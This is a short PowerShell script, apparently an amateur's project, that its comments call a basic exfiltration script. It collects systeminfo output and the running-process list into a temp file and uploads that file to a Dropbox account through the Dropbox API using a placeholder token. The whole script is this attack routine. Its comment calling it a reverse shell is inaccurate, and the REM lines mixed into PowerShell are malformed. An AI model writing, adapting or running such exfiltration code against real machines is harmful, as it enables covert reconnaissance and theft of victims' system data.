REM second project
REM Type: basic EXFIL / POWERSHELL SCRIPT 
REM not for badUSB use
REM Detail: Gathers network info/processes then EXFIL to dropbox. (revers shell)

  REM (Definitons)

  REM defining outputfile
$outputFile = "$env:temp\systeminfo.txt" 
  REM gets system information then outputs into txt file
systeminfo > $outputFile
  REM self-explanatory, adds content to the txt file for organization
Add-Content -Path $outputFile -Value "n===== Running Processes =====n"
  REM gets processses list and adds the extra to the txt file; -Append simply does not overwriting it
Get-Process | Out-File -FilePath $outputFile -Append


REM Second step: the actual EXFIL part (dropbox)

REM replace "YOUR_DROPBOX_API_TOKEN" with your token

$dropboxToken = "YOUR_DROPBOX_API_TOKEN"
$response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
    -Headers @{
        "Authorization" = "Bearer $dropboxToken";
        "Dropbox-API-Arg" = '{"path": "/systeminfo.txt", "mode": "overwrite"}';
        "Content-Type" = "application/octet-stream"
    } `
    -Method Post -InFile "$env:temp\systeminfo.txt"

REM Log the response to confirm upload
Write-Output "Dropbox Upload Response: $($response)"
